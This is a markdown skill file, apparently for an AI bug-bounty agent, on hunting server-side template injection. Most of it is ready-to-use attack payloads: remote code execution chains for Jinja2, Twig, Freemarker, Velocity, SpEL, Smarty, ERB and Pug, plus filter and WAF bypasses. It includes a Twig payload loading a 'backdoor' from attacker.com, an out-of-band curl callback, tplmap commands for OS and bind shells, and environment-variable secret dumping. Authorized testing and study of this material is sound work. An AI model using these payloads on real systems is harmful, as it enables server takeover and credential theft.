---
name: ssti
description: Hunt Server-Side Template Injection (SSTI) in Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Handlebars, Mustache, and Spring (SpEL). Use when input is reflected in a way that suggests template rendering — error pages, email templates, PDF generators, dynamic content systems.
metadata:
  type: skill
  phase: hunt
  vuln_class: ssti
  cwe: 1336
  tools: [tplmap]
---

# Server-Side Template Injection (SSTI)

> Reflects `{{7*7}}` as `49` → likely RCE coming.

## When to invoke

**Trigger phrases:**
- "test SSTI"
- "template injection"
- "Jinja2 RCE"
- "Twig SSTI"
- "Freemarker injection"

## SSTI detection table

Send each probe and inspect the rendered output. If math is evaluated, SSTI is likely.

| Engine | Detection probe | Math output |
|---|---|---|
| Jinja2 (Python/Flask/Django) | `{{7*7}}` | `49` |
| Twig (PHP/Symfony) | `{{7*7}}` | `49` |
| Mako (Python) | `${7*7}` | `49` |
| Velocity (Java) | `#set($x=7*7)$x` | `49` |
| Freemarker (Java) | `${7*7}` | `49` |
| Spring SpEL | `${7*7}` or `T(java.lang.Math).pow(7,7)` | `49` |
| Smarty (PHP) | `{7*7}` | `49` |
| Handlebars (JS) | `{{7*7}}` | usually NOT evaluated (uses helpers) |
| ERB (Ruby/Rails) | `<%= 7*7 %>` | `49` |
| Pug (JS) | `#{7*7}` | `49` |
| Razor (.NET) | `@(7*7)` | `49` |
| Liquid (Shopify/Jekyll) | `{{ 'a' \| times:7 }}` | `aaaaaaa` |

Universal poly-probe (gets evaluated by most engines):
```
${{<%[%'"}}%\
```

If the response shows any error / partial render → suspect SSTI.

## Step-by-Step Workflow

### 1. Identify candidate sinks

Inputs likely to flow into templates:
- Personalization fields (greeting "Hello, USER")
- Email subject / body editors
- Notification message customization
- PDF / invoice templates (you set company name → renders)
- Slack/Discord message templates
- Custom domain branding (logo URL, theme color, footer)
- Order confirmation templates
- Error messages that include user input ("Sorry, USER, page not found")
- "Preview" features
- Markdown extensions / custom tags

### 2. Confirm engine

If `{{7*7}}` returns `49`, narrow further:

```python
# Jinja2 vs Twig (both render {{7*7}} = 49)
# Test Jinja2-specific:
{{7*'7'}}      → Jinja2: '7777777'  | Twig: 49
{{config}}     → Jinja2: <Config {...}> | Twig: error

# Velocity (Java) vs Freemarker
${7*7}                  → both render 49
#set($x=7*7)$x          → Velocity-only
<#assign x=7*7>${x}     → Freemarker-only
```

### 3. Engine-specific payloads (escalation to RCE)

#### Jinja2 (Python — Flask, Django, Ansible)

```python
# Probe object access
{{config}}                                                    # Flask config dump
{{config.items()}}
{{request}}
{{self}}
{{self.__class__}}
{{self.__class__.__mro__}}

# Classic RCE chain (subclasses)
{{''.__class__.__mro__[2].__subclasses__()}}
# Find <class 'subprocess.Popen'> index, e.g. 408:
{{''.__class__.__mro__[2].__subclasses__()[408]('id', shell=True, stdout=-1).communicate()[0]}}

# More portable (works across Python versions)
{{''.__class__.__base__.__subclasses__()}}
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read() }}

# Universal RCE (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Bypass {} blocked (use {% %})
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{% endif %}{% endfor %}

# Bypass dot blocked (use [])
{{ ''['__class__'] }}
{{ request['__class__'] }}

# Bypass __ blocked (Hex/Unicode)
{{ ''['\x5f\x5fclass\x5f\x5f'] }}
{{ ''|attr('_class__') }}
{{ request|attr("class") }}    # using |attr filter
```

#### Twig (PHP — Symfony, Drupal 8+)

```php
# Probe
{{_self}}
{{_self.env}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE via filter
{{_self.env.setCache("ftp://attacker.com:2121")}}{{_self.env.loadTemplate("backdoor")}}

# Twig 1.x
{{["id"]|filter("system")}}

# Twig 2.x / 3.x (sandboxed)
{{["id"]|map("system")|join}}
```

#### Freemarker (Java — old versions)

```
${"freemarker.template.utility.Execute"?new()("id")}

# Newer versions (sandbox)
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

#### Velocity (Java)

```
#set($x="")
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($chr=$x.class.forName("java.lang.Character"))
#set($str=$x.class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

#### Spring SpEL (Java)

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","id"})}

# Or via complex chain
${new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression("T(java.lang.Runtime).getRuntime().exec('id')").getValue()}
```

#### Smarty (PHP)

```php
{php}echo `id`;{/php}                  # Smarty 2.x
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}  # Smarty 3
```

#### ERB (Ruby — Rails)

```ruby
<%= `id` %>
<%= system("id") %>
<%= Kernel.exec("id") %>
<%= IO.popen("id").read %>
```

#### Pug (JavaScript)

```javascript
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

### 4. tplmap (automation)

```bash
git clone https://github.com/epinna/tplmap
cd tplmap
pip install -r requirements.txt

# Auto-detect + exploit
python tplmap.py -u "https://target.com/page?name=test"

# POST
python tplmap.py -u "https://target.com/page" --data "name=test"

# Get OS shell
python tplmap.py -u "URL" --os-shell

# Bind shell
python tplmap.py -u "URL" --bind-shell 4444
```

### 5. Blind SSTI

If no reflection, use OOB or time-based:

```python
# Jinja2 blind via OOB
{{ ''.__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].popen('curl http://your-interactsh.oast.fun/').read() }}

# Time-based
{{''.__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].popen('sleep 5').read()}}
```

### 6. Common WAF bypasses

```python
# Jinja2 — {{ blocked
{% for x in [].__class__.__base__.__subclasses__() %}{{ x }}{% endfor %}

# {{ encoded
%7B%7B7*7%7D%7D

# Unicode
{{7*7}}

# Using request.args directly
{{ request.args.q | safe }}    # if q in URL becomes the payload

# Dot/Bracket alternation
{{ ''.__class__.__mro__[1].__subclasses__() }}      # blocked
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}    # bracket form
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1) }}    # filter form
```

## Detection script (multi-engine)

```bash
#!/bin/bash
URL="$1"
PARAM="$2"

PROBES=(
    "{{7*7}}"
    "\${7*7}"
    "<%= 7*7 %>"
    "#set(\$x=7*7)\$x"
    "{7*7}"
    "@(7*7)"
    "#{7*7}"
)

for p in "${PROBES[@]}"; do
    encoded=$(echo -n "$p" | jq -sRr @uri)
    response=$(curl -s "${URL}?${PARAM}=${encoded}")
    if echo "$response" | grep -q "49"; then
        echo "[SSTI?] $p worked: $URL"
    fi
done
```

## Output template

```markdown
## Critical: SSTI (Jinja2) in welcome-email template → RCE

### Summary
The "personalized welcome email" preview feature renders user-supplied input through a Jinja2 template without sandboxing. Authenticated users can achieve arbitrary code execution on the application server.

### Steps to reproduce
1. Log in as any user
2. Navigate to Settings → Email templates → Welcome email
3. Set "greeting" to:
   ```
   {{ ''.__class__.__mro__[1].__subclasses__()[408].__init__.__globals__['os'].popen('id').read() }}
   ```
4. Click "Preview"
5. The preview area renders:
   ```
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

### Verification
- Tested commands: `id`, `whoami`, `cat /etc/hostname`, `cat /proc/self/environ`
- /proc/self/environ leaked env vars including:
  - `DATABASE_URL` (RDS connection string)
  - `STRIPE_SECRET_KEY`
  - `JWT_SIGNING_KEY`

### Impact
- Arbitrary code execution as `www-data` on production hosts
- Lateral movement to RDS, Stripe API (with disclosed keys)
- Persistence possible via cron / web shell

### Suggested fix
1. Switch to a sandbox template engine (Jinja2 SandboxedEnvironment)
2. OR escape user input before template rendering (treat as data, not template)
3. Rotate exposed credentials (Stripe, DB)
```

## Cross-references

- `[[xss]]` — sometimes SSTI manifests as XSS first
- `[[file-upload]]` — uploaded files may be rendered as templates
- `[[content-discovery]]` — finds template-using endpoints
- `[[cloud-misconfig]]` — RCE on cloud = pivot to cloud takeover

## Common pitfalls

1. **Confusing client-side template (Handlebars in browser) with server-side.** Client-side doesn't pay.
2. **Testing `{{7*7}}` and getting `49` rendered as text doesn't always mean SSTI** — could be a different reason for echo. Verify with `{{7*'7'}}` (string repetition).
3. **Sandboxed engines (Twig 2/3, Jinja2 SandboxedEnvironment)** look like SSTI but won't RCE. Still worth reporting if data leakage possible.
4. **Reporting `{{7*7}}=49` without RCE attempt.** Some programs accept it as critical, most want RCE proof.
5. **Not noting the engine in the report.** Triagers struggle without engine name.

## Engine fingerprinting cheat

| Render of `${{<%[%'"}}%\` | Engine |
|---|---|
| Renders as-is | No SSTI |
| Error mentioning "Twig" | Twig |
| Error mentioning "Jinja" | Jinja2 |
| Error mentioning "Velocity" or "Freemarker" | Java |
| Error mentioning "Smarty" | Smarty |
| 500 with no info | Try engine-specific probes |

## arsenal/ssti-payloads/

Pre-built payload sets per engine — see `arsenal/ssti-payloads/`:
- `jinja2.txt`
- `twig.txt`
- `freemarker.txt`
- `velocity.txt`
- `spel.txt`
- `smarty.txt`
- `erb.txt`
- `multi-engine-polyglots.txt`
